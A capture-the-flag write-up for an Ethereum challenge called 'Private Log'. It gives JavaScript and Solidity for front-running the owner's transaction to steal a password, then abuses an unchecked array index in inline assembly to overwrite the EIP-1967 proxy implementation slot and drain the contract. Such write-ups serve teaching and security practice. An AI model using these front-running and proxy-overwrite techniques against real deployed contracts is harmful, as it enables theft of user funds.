# Private Log Writeup 

Solve script is `solve.js`

In this challenge we are required to steal all the funds from a contract which seemingly doesn't not have any functionality to send or even receive funds. 

In the challenge description we are given two critical pieces of information. 

1. The challenge contract is deployed as a TransparentUpgradeableProxy which points to the Logic contract
2. A new log entry is added every minute by the contract owner.

Both of the main functions `createLogEntry` and `updateLogEntry` are protected by a `hasSecret` modifier which requires you to know the password that was hashed in the previous transaction, aswell as provide a new one. Since a new log is creted every minute, the password changes every minute.

To solve this challenge there are 3 main steps. 

1. Front run the user transaction to steal the password and take control of the `secretHash` variable.
2. Abuse a bug in the `updateLogEntry` function to write *almost* anything to an arbritrary storage address
3. Overwrite the proxy implementation address to an attacker owned address which then sends the funds.

Let's dive in.

## Front Running 

If you set up a listener for new transactions you will notice that every minute a new tx comes through creating a new log entry

```js
provider.on("pending", async (tx) => {
        console.log(tx)
    })
```

In the challenge description we see that the block time is set to 23 seconds. This gives us lots of time to read the pending transaction's details and then send another transaction with a higher gas price such that our's will get processed first in the block. We then can set the newHash to anything we like so that we now can create and update logs as we wish!

```js
    // Connect To Contract
    const pathToContract = path.resolve(path.join(__dirname, './PrivateLog.json'));
    const abiData = JSON.parse(fs.readFileSync(pathToContract).toString()).abi;
    const tokenContract = new ethers.Contract(contractAddr, abiData, wallet);

    // Parse transaction data 
    const iface = new ethers.utils.Interface(abiData);
    const oldSecret = iface.parseTransaction(frontruntx).args.password;
    console.log("Secret is:", oldSecret)

    // Front Run with our new secret
    const secret = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    // Hashed password.
    const pwhash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(secret));

    console.log("Sending front run transaction with new hash");
    await (await tokenContract.createLogEntry("My log now", oldSecret, pwhash, {
        gasPrice: "1000000105",
        gasLimit: "100000"
    })).wait();
```

## Arbritrary Storage Write

Now looking at the `updateLogEntry` function we can see that is updating the logs through assembly, let's walk through what each line does.

```
// Loads the length of the string into the length var 
let length := mload(logEntry)

// Stores the storage address of logEntries in the 0x00 scratch space.
mstore(0x00, logEntries.slot)
```

sstore(addr, val) stores a new value 'val' in storage at mem address 'addr'
The address is calculated by hashing 32 bytes starting from the address 
stored at mem[0x00] (which is what we set in the line above). Then adding
the logIndex to get our offset. This is the address we will store our value at.

The value is grabbed by, adding 0x20 to the logEntry address to get the address
of the start of the string (the first 32bytes store the length of the string).
The value of that address is loaded using mload and OR'd with the length of the string mul(tiplied) 
by 2. This is all following the [documentation spec](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html#mappings-and-dynamic-arrays). 

```
sstore(add(keccak256(0x00, 0x20), logIndex), or(mload(add(logEntry, 0x20)), mul(length, 2)))
```

Now since we control the `logIndex` parameter we can fully control the address that is being written to in sstore() meaning we can essentially write to any storage slot. The bug here is that there is no check that the logIndex is less than the the length of the array.

Now we can write to any slot we will want to with *almost* full control of what is written there.

Note that integer overflows work in assembly so we are able to wrap around the whole storage address space.

## Overwriting Proxy Implementation

This writeup won't go into super detail of what a Proxy contract is. But here is the high level overview of what you need to know for this challenge. 

A proxy contract delegates all logic to an external contract, whilst maintaining all state in the proxy contract. So when you call the proxy contract with `createLogEntry` it will execute the logic of the PrivateLog.sol contract but in the context of the Proxy contract.

Now a proxy contract has the address of the *implementation* contract which it delegates all it's calls to stored at a specific memory address defined in [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967). This specific address is `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`.

So if we are able to write to that storage address with the address of a contract that we control. We can change the logic of the functions to send the funds of the contract to our address!

So to calculate the `logIndex` parameter we need to provide we need to do some math since the start of the logEntries data is located at a slot higher than the EIP hash, we need to do an integer overflow. So

logEntries is slot number 2, (slot 0 is Initializable vars, slot 1 is secretHash), so

address = MAX_UINT256 - keccak256(2) + EIP_HASH 

```js
const maxint = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
const address = ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.hexZeroPad(2, 32)))
const logIndex = ethers.BigNumber.from(maxint).sub(address).add(eiphash).add(1).toHexString().slice(2);

console.log("Calculates log index is", logIndex);
```

Ok so now we have the logIndex we need to provide, we can just update the logEntry with our contract address and be done right? right?

But there is a catch, we can't just write any values to the storage because we are storing them as strings. Strings in solidity are stored left aligned so if we stored the string "hello" it would be stored as: 

`0x68656c6c6f00000000000000000000000000000000000000000000000000000a`

(note the last byte is 0x0a, to store the length of the string * 2)

Whereas we would want to store a contract address as
`0x0000000000000000000000006189762f79de311B49a7100e373bAA97dc3F4bd0`

So we need to send a string which is 31 bytes long, prepended with null bytes with our contract address afterwards. buttttttt, the length of the string is also going to be stored as the 32nd byte. So if we have a string of length 31 it will store (31 * 2 = 62 = 0x3e) as the last byte.

So our attacking contract will need to have it's last byte also be 0x3e (Which is a 1/256 chance). Contract addresses are determinable given the deployer and nonce of the transaction. Ethers.js has a handy function for this:

```js
const nextContractAddr = ethers.utils.getContractAddress({
            from: wallet.address,
            nonce: nonce
        });
```

Once we have our contract address ending in 0x3e, we can then send our exploit tx! 
Our logEntry is a string of length 31 bytes with the first 12 bytes being null 0x00, the next 19 is our contract address without the last byte, followed by another 0x00.

We then construct our payload and then send it through :).


```js
const payload = ethers.utils.hexZeroPad(0, 12).slice(2) + attackContract.address.slice(2).slice(0, -2) + "00";

    // ABI Encoded data because libraries won't let us encode non UTF-8 bytes as strings.
    // Calling  updateLogEntry(uint256, string, string, bytes32)

    // FORMAT:
    /**
     * Header
     * bytes[0 - 3]: 0xdd1b54d3 -> function signature
     * 
     * Data
     * 0x00 = uint256 calculated address from above to hit EIP storage slot
     * 0x20 = Where to start reading for the "logEntry" string. In this case byte 0x80
     * 0x40 = Where to start reading for the  "password" string. In this case byte 0xc0
     * 0x60 = bytes32 newHash value
     * 0x80 = length of string to read for (logEntry) which is 0x1f as it is 31 bytes
     * 0xA0 = actual string value for logEntry
     * 0xC0 = length of string to read for (password) which is 0x1e as it is 30 bytes
     * 0xE0 = actual string value for password
     */

    const toSend = "0x{{function_selector}}{{address}}{{logEntry_start}}{{password_start}}{{pwhash}}{{payload_length}}{{payload}}{{secret_length}}{{secret}}";

    const formatted = toSend
        .replace("{{function_selector}}", "dd1b54d3")
        .replace("{{address}}", logIndex)
        .replace("{{logEntry_start}}", ethers.utils.hexZeroPad("0x80", 32).slice(2))
        .replace("{{password_start}}", ethers.utils.hexZeroPad("0xc0", 32).slice(2))
        .replace("{{pwhash}}", pwhash.slice(2))
        .replace("{{payload_length}}", ethers.utils.hexZeroPad("0x1f", 32).slice(2))
        .replace("{{payload}}", payload)
        .replace("{{secret_length}}", ethers.utils.hexZeroPad("0x1e", 32).slice(2))
        .replace("{{secret}}", secretHex.slice(2) + "0000")
        .toLowerCase();
    
    console.log("Sending exploit tx");
    const tx = {
        to: contractAddr,
        data: formatted,
    };
```

Now that we have overwritten the implementation address we can call any of the function of our contract that we created and it will be executed in the context of the proxy. 

In the writeup we use `AttackPrivateLog.sol` as the contract and call the init() function. 

```
contract AttackPrivateLog {

    function init(bytes32 _secretHash) payable public  {
        uint256 bal = address(this).balance;
        payable(msg.sender).transfer(bal);
    }

}
```

This sends the balance of the contract to the sender and boom challenge done!